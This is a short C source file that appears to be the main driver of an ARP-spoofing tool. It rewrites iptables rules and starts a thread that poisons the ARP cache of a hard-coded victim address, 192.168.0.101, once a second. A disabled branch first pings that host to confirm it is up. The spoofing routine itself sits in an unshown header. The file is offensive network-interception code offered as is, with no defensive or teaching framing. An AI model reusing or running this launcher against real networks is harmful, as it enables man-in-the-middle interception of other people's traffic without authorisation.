#include "core.h"
#include <pthread.h>
#include <signal.h>

int ICMP_SOCK = -1;
pthread_t ARP_SPOOF_TID = -1;
ARPSpoofScriptArgs ARP_SPOOF_SCRIPT_ARGS = {0};

void sigint_handler(int sig) {
    ARP_SPOOF_SCRIPT_ARGS.is_terminated = 1;
}

#if 0
void main(void) {
    ICMP_SOCK = get_icmp_socket();
    char* target_addr_str = "192.168.0.101";
    u32 target_addr_hl = inet_addr(target_addr_str);
    int target_port_hs = 0;
    send_icmp_request(ICMP_SOCK, 1, target_addr_hl, target_port_hs);
    icmp rep = {0};
    if (receive_icmp_reply(ICMP_SOCK, &rep, 3)) {
        printf("%s is alive\n", target_addr_str);
    }
}
#else
void main(void) {
    reset_iptables();
    set_iptables();
    signal(SIGINT, sigint_handler);

    ARP_SPOOF_SCRIPT_ARGS.if_name = "wlp1s0";
    ARP_SPOOF_SCRIPT_ARGS.victim_addr_str = "192.168.0.101";
    ARP_SPOOF_SCRIPT_ARGS.spoof_period_sec = 1;

    if (pthread_create(
            &ARP_SPOOF_TID,
            NULL,
            start_arp_spoof_script,
            (void*)&ARP_SPOOF_SCRIPT_ARGS
        )
        != 0) {
        fprintf(
            stderr, "ERROR: Failed to create start_arp_spoof thread\n"
        );
        exit(1);
    }

    pthread_join(ARP_SPOOF_TID, NULL);
    reset_iptables();
    exit(0);
}
#endif
